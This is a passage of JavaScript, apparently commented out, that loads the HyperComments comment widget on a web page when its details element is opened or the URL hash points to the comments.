           window.sendSnapshot();
         });
      }}];

      window.HC_LOAD_INIT = true;
      // see https://www.hypercomments.com/en/documentation
      var lang = document.documentElement.lang.slice(0, 2).toLowerCase();
      var src = "https://w.hypercomments.com/widget/hc/" + WIDGET_ID + "/" + lang + "/widget.js";
      PageUtils.$import(src)["catch"](function (error) {
        toggleHidden(false);
        window._hcwp = undefined;
      });
      var toggleHidden = function (isLoading) {
        details.querySelector("progress").hidden = !isLoading;
        details.querySelector(".powered-text").hidden = !isLoading;
        details.querySelector(".cannot-load-text").hidden = isLoading;
      };
      toggleHidden(true);
    }
  };

  details.addEventListener("toggle", function (event) {
    showComments();
  }, false);

  var isMobile = true; // too big images

  var checkHash = function (event) {
    if (window.location.protocol !== "file:" && window.location.hostname !== "127.0.0.1") {
      var hash = decodeLocationHash(window.location.hash.slice(1));
      if (!isMobile || hash.indexOf("hcm") !== -1 || hash.indexOf("hypercomments_widget") !== -1) {
        if (details.getAttribute("open") == undefined) {
          details.querySelector("summary").click();
        }
        showComments();
      }
    } else {
      details.hidden = true;
    }
  };
  checkHash(undefined);
  window.addEventListener("hashchange", checkHash, false);

});
*/